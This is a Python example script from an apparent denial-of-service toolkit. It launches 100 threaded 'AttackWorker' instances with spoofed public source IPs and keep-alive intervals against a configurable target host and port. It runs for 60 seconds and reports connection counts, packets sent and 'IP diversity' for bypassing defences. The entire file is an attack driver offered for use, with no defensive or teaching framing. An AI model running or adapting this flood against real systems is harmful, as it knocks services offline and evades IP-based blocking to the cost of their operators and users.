#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Example 2: Advanced Attack (With IP Spoofing + Custom Config)
"""

import sys
sys.path.insert(0, '..')

from src import AttackWorker, AttackStatistics, IPGenerator, Colors, setup_logging
import threading
import time

def main():
    print(f"{Colors.OKGREEN}[Example] Advanced Attack - With IP Spoofing{Colors.ENDC}\n")
    
    # Configuration
    target_ip = "192.168.1.100"
    target_port = 80
    threads_count = 100
    custom_timeout = 5
    custom_keep_alive = 2
    
    print(f"Target: {target_ip}:{target_port}")
    print(f"Threads: {threads_count}")
    print(f"Spoofing: ENABLED")
    print(f"Timeout: {custom_timeout}s")
    print(f"Keep-Alive Interval: {custom_keep_alive}s\n")
    
    # Setup
    setup_logging("advanced_attack.log")
    stats = AttackStatistics()
    
    # Test IP Generator
    print(f"{Colors.OKCYAN}[Test] Generating 5 sample IPs:{Colors.ENDC}")
    for i in range(5):
        ip = IPGenerator.generate_public_ip()
        print(f"  {i+1}. {ip}")
    print()
    
    # Start workers with custom config
    workers = []
    for i in range(threads_count):
        worker = AttackWorker(
            target_ip, 
            target_port, 
            stats, 
            worker_id=i, 
            use_spoofing=True,  # Enable spoofing
            timeout=custom_timeout,
            keep_alive_interval=custom_keep_alive
        )
        thread = threading.Thread(target=worker.run, daemon=True)
        thread.start()
        workers.append(worker)
        time.sleep(0.01)
    
    # Monitor for 60 seconds
    try:
        print("Running for 60 seconds... Press Ctrl+C to stop early\n")
        for i in range(60):
            time.sleep(1)
            if (i + 1) % 10 == 0:
                current = stats.get_stats()
                print(f"[{i+1}s] Active: {current['connections_active']}, "
                      f"Success: {current['success_rate']:.1f}%, "
                      f"IPs: {current['unique_ips_used']}")
    except KeyboardInterrupt:
        pass
    
    # Stop
    print("\nStopping...")
    for worker in workers:
        worker.stop()
    
    time.sleep(2)
    
    # Show stats
    final_stats = stats.get_stats()
    print(f"\n{Colors.OKBLUE}{'='*60}")
    print(f"{'FINAL STATS':^60}")
    print(f"{'='*60}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Connections Established: {final_stats['connections_established']:,}")
    print(f"Connections Failed     : {final_stats['connections_failed']:,}")
    print(f"Success Rate           : {final_stats['success_rate']:.2f}%")
    print(f"Packets Sent           : {final_stats['total_packets']:,}")
    print(f"\n{Colors.OKCYAN}[Spoofing Metrics]{Colors.OKGREEN}")
    print(f"Unique IPs Used        : {final_stats['unique_ips_used']:,}")
    print(f"IP Diversity           : {final_stats['bypass_diversity']:.2f}%{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
